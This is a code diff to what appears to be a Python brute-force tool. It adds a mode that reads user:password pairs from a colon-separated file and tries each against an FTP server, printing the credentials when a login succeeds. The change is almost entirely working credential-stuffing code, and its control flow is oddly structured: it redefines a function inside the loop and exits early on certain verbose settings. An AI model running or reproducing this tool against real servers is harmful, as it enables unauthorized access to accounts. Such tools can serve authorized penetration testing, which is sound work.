@@ -358,8 +358,35 @@ elif args.service == "ftp":
                                   "\n Username found:", user,
                                   "\n------------------------------------------")
                             exit(0)
-
                 connect_ftp(target, port, user, password)
+
+        # When colon_file is provided
+        if args.colon_file in sys.argv:
+            file = open(colon_file)
+            for line in file.readlines():
+                if ":" in line:
+                    user = line.split(':')[0]
+                    pwd = line.split(':')[1]
+
+
+                    def connect_ftp(target, port, user, pwd):
+                        server = ftplib.FTP()
+                        if args.verbose in sys.argv:
+                            if args.verbose != "show":
+                                exit(0)
+                            try:
+                                server.connect(target, port, timeout=10)
+                                server.login(user, pwd)
+                            except ftplib.error_perm:
+                                print('\033[1;37m''[+]', user, '_', pwd)
+                                pass
+                            else:
+                                print("\n\033[1;92m-----------------------------------------"
+                                      "\n Username and Password found:", user, pwd,
+                                      "\n------------------------------------------")
+                                exit(0)
+                    connect_ftp(target, port, user, pwd)
+
     except KeyboardInterrupt:
         print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
         exit(0)
